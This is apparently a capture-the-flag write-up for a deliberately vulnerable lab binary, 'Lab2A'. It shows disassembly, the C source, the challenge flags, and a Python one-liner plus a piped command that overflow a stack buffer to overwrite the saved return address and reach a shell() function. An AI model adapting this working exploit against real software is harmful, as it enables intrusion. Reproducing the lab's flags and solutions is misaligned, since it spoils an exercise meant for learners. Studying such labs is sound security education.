## Lab2A

`i_c4ll_wh4t_i_w4nt_n00b`

```
Dump of assembler code for function concatenate_first_chars:
   0x0804871d <+0>:     push   ebp
   0x0804871e <+1>:     mov    ebp,esp
   0x08048720 <+3>:     sub    esp,0x38
   0x08048723 <+6>:     lea    eax,[ebp-0x28]
   0x08048726 <+9>:     add    eax,0x14
   0x08048729 <+12>:    mov    DWORD PTR [ebp-0x18],eax
   0x0804872c <+15>:    mov    DWORD PTR [esp],0x80488a3
   0x08048733 <+22>:    call   0x80485c0 <puts@plt>
   0x08048738 <+27>:    mov    DWORD PTR [ebp-0x1c],0x0
   0x0804873f <+34>:    jmp    0x8048792 <concatenate_first_chars+117>
   0x08048741 <+36>:    mov    eax,ds:0x804a02c
   0x08048746 <+41>:    mov    DWORD PTR [esp+0x8],eax
   0x0804874a <+45>:    mov    DWORD PTR [esp+0x4],0x10
   0x08048752 <+53>:    lea    eax,[ebp-0x28]
   0x08048755 <+56>:    mov    DWORD PTR [esp],eax
   0x08048758 <+59>:    call   0x80485b0 <fgets@plt>
   0x0804875d <+64>:    test   eax,eax
   0x0804875f <+66>:    je     0x8048769 <concatenate_first_chars+76>
   0x08048761 <+68>:    movzx  eax,BYTE PTR [ebp-0x28]
   0x08048765 <+72>:    cmp    al,0xa
   0x08048767 <+74>:    jne    0x8048777 <concatenate_first_chars+90>
   0x08048769 <+76>:    mov    DWORD PTR [esp],0x80488b3
   0x08048770 <+83>:    call   0x80485c0 <puts@plt>
   0x08048775 <+88>:    jmp    0x80487b4 <concatenate_first_chars+151>
   0x08048777 <+90>:    mov    eax,DWORD PTR [ebp-0x18]
   0x0804877a <+93>:    movzx  edx,BYTE PTR [ebp-0x28]
   0x0804877e <+97>:    mov    BYTE PTR [eax],dl
   0x08048780 <+99>:    mov    eax,DWORD PTR [ebp-0x18]
   0x08048783 <+102>:   add    eax,0x1
   0x08048786 <+105>:   mov    DWORD PTR [ebp-0x18],eax
   0x08048789 <+108>:   mov    eax,DWORD PTR [ebp-0x1c]
   0x0804878c <+111>:   add    eax,0x1
   0x0804878f <+114>:   mov    DWORD PTR [ebp-0x1c],eax
   0x08048792 <+117>:   mov    eax,DWORD PTR [ebp-0x1c]
   0x08048795 <+120>:   cmp    eax,0xa
   0x08048798 <+123>:   jne    0x8048741 <concatenate_first_chars+36>
   0x0804879a <+125>:   mov    BYTE PTR [ebp-0xa],0x0
   0x0804879e <+129>:   lea    eax,[ebp-0x28]
   0x080487a1 <+132>:   add    eax,0x14
   0x080487a4 <+135>:   mov    DWORD PTR [esp+0x4],eax
   0x080487a8 <+139>:   mov    DWORD PTR [esp],0x80488c8
   0x080487af <+146>:   call   0x80485a0 <printf@plt>
   0x080487b4 <+151>:   leave  
   0x080487b5 <+152>:   ret    
End of assembler dump.

```

`python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaa\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\na\nb\n\xfd\n\x86\n\x04\n\x08\n'" > /tmp/a.txt`

`cat /tmp/a.txt -| ./lab2A`

**`D1d_y0u_enj0y_y0ur_cats?`**

***

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * compiled with:
 * gcc -O0 -fno-stack-protector lab2A.c -o lab2A
 */

void shell()
{
        printf("You got it\n");
        system("/bin/sh");
}

void concatenate_first_chars()
{
        struct {
                char word_buf[12];
                int i;
                char* cat_pointer;
                char cat_buf[10];
        } locals;
        locals.cat_pointer = locals.cat_buf;

        printf("Input 10 words:\n");
        for(locals.i=0; locals.i!=10; locals.i++)
        {
                // Read from stdin
                if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
                {
                        printf("Failed to read word\n");
                        return;
                }
                // Copy first char from word to next location in concatenated buffer
                *locals.cat_pointer = *locals.word_buf;
                locals.cat_pointer++;
        }

        // Even if something goes wrong, there's a null byte here
        //   preventing buffer overflows
        locals.cat_buf[10] = '\0';
        printf("Here are the first characters from the 10 words concatenated:\n\
%s\n", locals.cat_buf);
}

int main(int argc, char** argv)
{
        if(argc != 1)
        {
                printf("usage:\n%s\n", argv[0]);
                return EXIT_FAILURE;
        }

        concatenate_first_chars();

        printf("Not authenticated\n");
        return EXIT_SUCCESS;
}
```

locals.word_buf is 12 characters long but fgets allows us to write 16 characters thereby overwriting locals.i
Since the loop uses `locals.i != 10` instead of `locals.i <10` we can input any number of words after overwriting the value of i. 
Finally, we overwrite the saved eip by overflowing cat_buf.




